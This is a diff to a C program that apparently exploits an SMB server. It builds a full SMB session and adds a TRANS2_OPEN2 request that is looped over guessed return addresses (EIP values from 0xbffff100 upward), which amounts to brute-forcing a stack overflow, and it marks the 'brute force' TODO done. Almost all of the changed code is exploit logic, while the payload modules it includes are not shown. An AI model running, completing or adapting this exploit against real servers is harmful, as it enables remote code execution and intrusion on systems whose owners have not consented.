@@ -14,6 +14,7 @@
 #include "./src/smb_com_negotiate/module_ptr.h"
 #include "./src/smb_com_nt_create_andx/module_ptr.h"
 #include "./src/smb_com_session_setup_andx/module_ptr.h"
+#include "./src/smb_com_trans2_open2/module_ptr.h"
 #include "./src/smb_com_tree_connect_andx/module_ptr.h"
 
 // TARGET
@@ -58,59 +59,78 @@ int sock_connect(int sock, uint8_t *address, uint16_t port) {
 }
 
 int main() {
-  int sock = getsock();
 
-  if (sock < 0) {
-    printf("ERR: Socket error\n");
-    return -1;
+  uint32_t start_eip = 0xbffff100;
+  uint32_t end_eip = 0xbffffff0;
+  uint32_t step = 400;
+
+  uint32_t curr_eip;
+
+  for (curr_eip = start_eip; curr_eip <= end_eip; curr_eip += step) {
+
+    printf("[*] Testing eip: 0x%08x ... ", curr_eip);
+    fflush(stdout);
+
+    int sock = getsock();
+    if (sock < 0) {
+      printf("[-] Socket error\n");
+      continue;
+    };
+
+    if (sock_connect(sock, ADDRESS, PORT) < 0) {
+      printf("[-] Connection error\n");
+      close(sock);
+      continue;
+    };
+
+    if (nbios_com_session_setup(sock) < 0) {
+      printf("[-] Nbios session failed\n");
+      close(sock);
+      return -1;
+    };
+
+    if (smb_com_negotiate(sock) < 0) {
+      printf("[-] Negotiation failed\n");
+      close(sock);
+      return -1;
+    };
+
+    int uid = smb_com_session_setup_andx(sock);
+    if (uid < 0) {
+      printf("[-] Smb session failed\n");
+      close(sock);
+      return -1;
+    };
+
+    int tid = smb_com_tree_connect_andx(sock, (uint16_t)uid);
+    if (tid < 0) {
+      printf("[-] Smb tree connect failed\n");
+      close(sock);
+      return -1;
+    };
+
+    if (smb_com_nt_create_andx(sock, uid, tid) < 0) {
+      printf("[-] Smb nt create failed\n");
+      close(sock);
+      return -1;
+    };
+
+    if (smb_com_trans2_open2(sock, tid, uid, curr_eip) < 0) {
+      printf("[-] Failed to send trans2 open2\n");
+      close(sock);
+      return -1;
+    };
+
+    close(sock);
+
+    printf("Done.\n");
+
+    usleep(200000);
   };
 
-  if (sock_connect(sock, ADDRESS, PORT) < 0) {
-    printf("ERR: connection error\n");
-    return -1;
-  }
-
-  // nbios_com_session_setup
-  if (nbios_com_session_setup(sock) < 0) {
-    printf("ERR: [NBIOS_COM_SESSION_SETUP] - failed\n");
-
-    close(sock);
-    return -1;
-  }
-
-  if (smb_com_negotiate(sock) < 0) {
-    printf("ERR: [SMB_COM_NEGOTIATE] - failed\n");
-
-    close(sock);
-    return -1;
-  }
-
-  short user_id = smb_com_session_setup_andx(sock);
-
-  if (user_id < 0) {
-    printf("ERR: [SMB_COM_SESSION_SETUP_ANDX] - failed\n");
-
-    close(sock);
-    return -1;
-  }
-
-  short tree_id = smb_com_tree_connect_andx(sock, user_id);
-
-  if (tree_id < 0) {
-    printf("ERR: [SMB_COM_TREE_CONNECT_ANDX] - failed\n");
-
-    close(sock);
-    return -1;
-  }
-
-  if (smb_com_nt_create_andx(sock, user_id, tree_id) < 0) {
-    printf("ERR: [SMB_COM_NT_CREATE_ANDX] - failed\n");
-
-    close(sock);
-    return -1;
-  }
+  printf("[+] Done. All eip was checked\n");
 
   return 0;
 };
 
-// TODO: [ ] Rework code to brute force archetecture
+// TODO: [X] Rework code to brute force archetecture
